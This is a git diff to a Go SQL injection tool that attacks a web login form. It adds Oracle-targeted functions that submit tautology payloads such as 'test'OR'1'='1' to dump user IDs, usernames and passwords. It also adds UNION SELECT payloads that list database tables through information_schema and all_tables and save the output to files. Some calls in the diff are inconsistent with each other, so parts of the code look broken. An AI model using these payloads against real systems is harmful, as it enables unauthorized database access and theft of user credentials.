@@ -79,10 +79,6 @@ func write_json_file(name, json_string string) bool {
 	return true;
 }
 
-func oracle_enumeration() {
-	fmt.Println("Oracle Enumeration Section");
-}
-
 func parse_data(data string) string {
 	re := regexp.MustCompile(`JSONSTART\[.*?\]JSONEND`);
 	foo := re.FindString(data);
@@ -111,7 +107,26 @@ func user_data_enum() {
 	}
 }
 
-func database_data_enum() {
+func oracle_user_data_enum() {
+	data := url.Values {
+		"username":		{"admin"},
+		"password":		{"test'OR'1'='1"},
+	};
+	code, body := get_response(data);
+	if (code == 200 && !(strings.Contains(body, "Fatal"))) {
+		fmt.Println("************************ USER DATA DISCOVERED ***************************\n");
+		fmt.Println("************************** ENUMERATING NOW ******************************\n");
+		var parsed_data string = parse_data(body);
+		var json_data []Userdata;
+		json.Unmarshal([]byte(string(parsed_data)), &json_data);
+		fmt.Println("USER DATA DISCOVERED:\n");
+		for _, val := range json_data {
+			fmt.Printf("\tID: %s\t|\tUSER: %s\t|\tPASSWORD: %s\n", val.Id, val.Username, val.Password);
+		}
+	}
+}
+
+func mysql_database_data_enum() {
 	data := url.Values {
 		"username":		{"admin'OR'1'='1"},
 		"password":		{"test' UNION SELECT table_name,table_schema,table_type FROM information_schema.tables;-- "},
@@ -119,12 +134,30 @@ func database_data_enum() {
 	code, body := get_response(data);
 	if (code == 200 && !(strings.Contains(body, "Fatal"))) {
 		fmt.Println(body);
+		write(data, "database_info.mysql");
+	}
+}
+
+func oracle_database_data_enum() {
+	data := url.Values {
+		"username":		{"admin'OR'1'='1"},
+		"password":		{"test' UNION SELECT owner, table_name, tablespace_name FROM all_tables-- "},
+	};
+	code, body := get_response(data);
+	if (code == 200 && !(strings.Contains(body, "Fatal"))) {
+		fmt.Println(body);
+		write_data(body, "database_info.oracle");
 	}
 }
 
 func mysql_enumeration() {
 	user_data_enum();
-	database_data_enum();
+	mysql_database_data_enum();
+}
+
+func oracle_enumeration() {
+	user_data_enum();
+	oracle_database_data_enum();
 }
 
 func main() {
